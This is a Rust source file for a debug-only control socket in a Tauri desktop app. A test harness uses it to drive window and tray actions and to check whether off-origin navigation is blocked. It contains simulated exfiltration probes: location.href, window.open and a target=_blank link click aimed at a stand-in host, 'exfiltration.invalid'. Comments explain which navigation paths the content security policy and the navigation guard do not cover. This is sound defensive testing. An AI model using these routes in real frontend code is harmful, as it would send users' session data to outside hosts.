// Copyright 2026 Mathews Tom
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//     https://www.apache.org/licenses/LICENSE-2.0

//! A debug-build control socket, so the qualification harness can drive
//! the real application.
//!
//! Apple ships no standalone `WKWebView` driver and no menu-bar
//! automation that does not require an Accessibility grant, so there is
//! no supported way to synthesize a tray click or a window close from
//! outside the process. This listener is the substitute: it accepts the
//! tray's own menu-item identities and the window verbs, and dispatches
//! them through exactly the functions the platform dispatches through.
//!
//! It is `#[cfg(debug_assertions)]` in full, and the socket lives
//! inside the configured storage root, which a hermetic run makes
//! disposable. A release build contains neither the listener nor its
//! verbs.

use std::io::{BufRead as _, BufReader};
use std::os::unix::net::UnixListener;
use std::path::{Path, PathBuf};

use tauri::Manager as _;

use crate::lifecycle::{tray, window};
use crate::state::Desktop;

/// The socket's name inside the storage root.
pub const FILE_NAME: &str = ".desktop-control.sock";

/// Close the main window the way its close button does.
const CLOSE_WINDOW: &str = "close-window";
/// Destroy the main window outright, so the next open must rebuild it.
const DESTROY_WINDOW: &str = "destroy-window";
/// Ask the frontend to navigate off the application's origin.
const NAVIGATE_OFFSITE: &str = "navigate-offsite";
/// Ask the frontend to open a *new* window off that origin.
const OPEN_OFFSITE: &str = "open-offsite";
/// Record where the main window actually is.
const RECORD_WINDOW_URL: &str = "record-window-url";
/// Record every webview the process has.
const RECORD_WEBVIEWS: &str = "record-webviews";

/// Where [`NAVIGATE_OFFSITE`] tries to go.
///
/// `.invalid` is reserved by RFC 2606 and resolves nowhere, so a run
/// that somehow reached the network would still not reach a host. The
/// query string stands in for what a real exfiltration would carry:
/// the session titles and configuration paths the granted commands
/// return.
const OFFSITE_URL: &str = "https://exfiltration.invalid/?titles=probe";

/// Starts accepting control verbs, one per line, one per connection.
///
/// A failure to bind is reported and not propagated: it costs the
/// process its qualification channel, not its ability to run.
pub fn serve(app: &tauri::AppHandle) {
    let path = socket_path(app.state::<Desktop>().application().root().path());
    let handle = app.clone();

    match bind(&path) {
        Ok(listener) => {
            std::thread::spawn(move || accept(&listener, &handle));
            crate::note!(app, "control-ready");
        }
        Err(error) => {
            eprintln!(
                "scrybe-desktop: could not open the control channel at {}: {error}",
                path.display()
            );
        }
    }
}

fn bind(path: &Path) -> std::io::Result<UnixListener> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    // A socket left behind by a previous run would otherwise make bind
    // fail for a process that is the rightful owner of this root.
    if path.exists() {
        std::fs::remove_file(path)?;
    }
    UnixListener::bind(path)
}

fn accept(listener: &UnixListener, app: &tauri::AppHandle) {
    for stream in listener.incoming() {
        let stream = match stream {
            Ok(stream) => stream,
            Err(error) => {
                eprintln!("scrybe-desktop: control channel accept failed: {error}");
                continue;
            }
        };
        for line in BufReader::new(stream).lines() {
            match line {
                Ok(verb) => dispatch(app, verb.trim().to_owned()),
                Err(error) => {
                    eprintln!("scrybe-desktop: control channel read failed: {error}");
                    break;
                }
            }
        }
    }
}

/// Runs `verb` on the main thread.
///
/// Window and tray work must happen there on macOS, and a control
/// channel that ran it anywhere else would be proving something the
/// real application never does.
fn dispatch(app: &tauri::AppHandle, verb: String) {
    let handle = app.clone();
    if let Err(error) = app.run_on_main_thread(move || run(&handle, &verb)) {
        eprintln!("scrybe-desktop: could not dispatch a control verb: {error}");
    }
}

fn run(app: &tauri::AppHandle, verb: &str) {
    match verb {
        CLOSE_WINDOW => close(app),
        DESTROY_WINDOW => destroy(app),
        NAVIGATE_OFFSITE => navigate_offsite(app),
        OPEN_OFFSITE => open_offsite(app),
        RECORD_WINDOW_URL => record_window_url(app),
        RECORD_WEBVIEWS => record_webviews(app),
        // Everything else is a tray menu item identity, dispatched
        // through the same function the platform's menu event uses.
        item => tray::activate(app, item),
    }
}

/// Closes through the real close path: this raises `CloseRequested`, so
/// the hide-on-close handler runs exactly as it does for the window's
/// own close button.
fn close(app: &tauri::AppHandle) {
    let Some(main) = app.get_webview_window(window::MAIN) else {
        eprintln!("scrybe-desktop: no main window to close");
        return;
    };
    if let Err(error) = main.close() {
        eprintln!("scrybe-desktop: could not close the main window: {error}");
    }
}

/// Destroys without raising `CloseRequested`, leaving the process with
/// no main window so the next open has to rebuild one.
fn destroy(app: &tauri::AppHandle) {
    let Some(main) = app.get_webview_window(window::MAIN) else {
        eprintln!("scrybe-desktop: no main window to destroy");
        return;
    };
    if let Err(error) = main.destroy() {
        eprintln!("scrybe-desktop: could not destroy the main window: {error}");
    }
}

/// Drives a top-level navigation off the application's origin, from
/// the frontend, the way frontend code execution would.
///
/// `location.href` is the path the content security policy cannot see:
/// it is not a fetch, a `WebSocket`, a beacon, or an iframe. Whether it
/// is refused is decided by the navigation guard alone, so this is how
/// a qualification run establishes the guard exists rather than
/// assuming it.
fn navigate_offsite(app: &tauri::AppHandle) {
    let Some(main) = app.get_webview_window(window::MAIN) else {
        eprintln!("scrybe-desktop: no main window to navigate");
        return;
    };
    crate::note!(app, "navigation-attempted", OFFSITE_URL);
    if let Err(error) = main.eval(format!("location.href = {OFFSITE_URL:?}")) {
        eprintln!("scrybe-desktop: could not drive a navigation: {error}");
    }
}

/// Drives the two ways frontend code asks for a *new* window.
///
/// Neither reaches the navigation guard. `location.href`, which
/// [`navigate_offsite`] drives, goes to the navigation-policy delegate,
/// and so do link clicks, form submissions, and meta-refresh. A
/// script-initiated `window.open` does not: `WebKit` routes it to
/// `webView:createWebViewWithConfiguration:forNavigationAction:` on the
/// *UI* delegate, and a click on a link carrying `target="_blank"` goes
/// the same way. `wry` answers that delegate method with `None`
/// whenever no new-window handler is registered, so this second
/// exfiltration door is currently held shut by the absence of a call
/// rather than by any decision this application makes — and the first
/// handler anyone adds opens it while the guard, the policy, and every
/// other check here stay green.
///
/// Driving both is how a run establishes that nothing opened, rather
/// than inferring it from a main-window URL that a new window would not
/// have changed anyway.
fn open_offsite(app: &tauri::AppHandle) {
    let Some(main) = app.get_webview_window(window::MAIN) else {
        eprintln!("scrybe-desktop: no main window to open from");
        return;
    };
    crate::note!(app, "new-window-attempted", OFFSITE_URL);
    let script = format!(
        "window.open({OFFSITE_URL:?}, '_blank');
         const probe = document.createElement('a');
         probe.href = {OFFSITE_URL:?};
         probe.target = '_blank';
         probe.textContent = 'probe';
         document.body.appendChild(probe);
         probe.click();
         probe.remove();"
    );
    if let Err(error) = main.eval(script) {
        eprintln!("scrybe-desktop: could not drive a new-window request: {error}");
    }
}

/// Records every webview window the process has, by label.
///
/// A new-window request that was answered rather than dropped arrives
/// as a second one, so the label list is the evidence that none did.
/// Sent after [`OPEN_OFFSITE`] has had time to take effect.
///
/// `webview_windows` rather than `webviews`, which is behind Tauri's
/// `unstable` feature and would widen this host's dependency surface
/// for a list that is the same one here: every webview this
/// application creates owns a window, and a new-window handler
/// answering with `NewWindowResponse::Create` hands back a
/// `WebviewWindow` too.
fn record_webviews(app: &tauri::AppHandle) {
    let mut labels: Vec<String> = app.webview_windows().into_keys().collect();
    labels.sort();
    crate::note!(app, "webview-labels", &labels.join(","));
}

/// Records where the main window is now.
///
/// Sent after [`NAVIGATE_OFFSITE`] has had time to take effect, so the
/// recorded URL is the answer to whether the navigation happened.
fn record_window_url(app: &tauri::AppHandle) {
    let Some(main) = app.get_webview_window(window::MAIN) else {
        eprintln!("scrybe-desktop: no main window to read a URL from");
        return;
    };
    match main.url() {
        Ok(url) => crate::note!(app, "window-url", url.as_str()),
        Err(error) => eprintln!("scrybe-desktop: could not read the main window URL: {error}"),
    }
}

/// Removes the socket as the process exits.
///
/// A socket left in the storage root would outlive the process that
/// owned it and would be the one thing a qualification run found in a
/// root it expects to hold nothing but the record.
pub fn remove_socket(app: &tauri::AppHandle) {
    let path = socket_path(app.state::<Desktop>().application().root().path());
    if let Err(error) = std::fs::remove_file(&path) {
        if error.kind() != std::io::ErrorKind::NotFound {
            eprintln!(
                "scrybe-desktop: could not remove the control channel at {}: {error}",
                path.display()
            );
        }
    }
}

/// Where the socket is, for a caller that has the storage root.
#[must_use]
pub fn socket_path(root: &Path) -> PathBuf {
    root.join(FILE_NAME)
}
